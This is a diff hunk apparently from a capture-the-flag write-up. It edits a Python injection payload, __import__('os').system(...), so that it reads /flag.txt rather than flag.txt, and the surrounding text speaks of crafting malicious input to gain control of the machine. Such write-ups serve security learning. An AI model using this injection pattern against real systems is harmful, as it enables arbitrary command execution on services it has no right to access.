@@ -31,7 +31,7 @@ By crafting a malicious input we could possibly gain control over the machine, s
 
 After some testing I got the following to work for me
 ```python
-__import__("os").system("cat flag.txt")
+__import__("os").system("cat /flag.txt")
 ```
 
 
